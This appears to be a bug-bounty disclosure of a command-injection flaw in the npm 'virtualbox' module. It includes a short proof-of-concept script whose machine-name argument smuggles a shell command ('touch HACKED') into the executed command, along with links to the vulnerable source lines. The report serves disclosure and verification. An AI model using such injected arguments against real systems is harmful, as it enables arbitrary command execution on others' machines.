The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))
1. Create the following PoC file:
```js
// poc.js
var virtualbox = require('virtualbox');

virtualbox.start('machine_name"; touch HACKED; # ', true, function start_callback(error) {
	if (error) throw error;
	console.log("Virtual Machine has started WITH A GUI!");
});
```
2. Check there aren't files called `HACKED`
3. Execute the following commands in another terminal:
```bash
npm i virtualbox # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
## References:
 - [GitHub Issue](https://github.com/Node-Virtualization/node-virtualbox/issues/66)
 - [GitHub Permalink #1](https://github.com/Node-Virtualization/node-virtualbox/blob/master/lib/virtualbox.js#L58)
 -  [GitHub Permalink #2](https://github.com/Node-Virtualization/node-virtualbox/blob/master/lib/virtualbox.js#L114)
 -  [GitHub Permalink #3](https://github.com/Node-Virtualization/node-virtualbox/blob/master/lib/virtualbox.js#L63)
 -  [GitHub Permalink #4](https://github.com/Node-Virtualization/node-virtualbox/blob/master/lib/virtualbox.js#L136)
 -  [GitHub Permalink #5](https://github.com/Node-Virtualization/node-virtualbox/blob/master/lib/virtualbox.js#L121)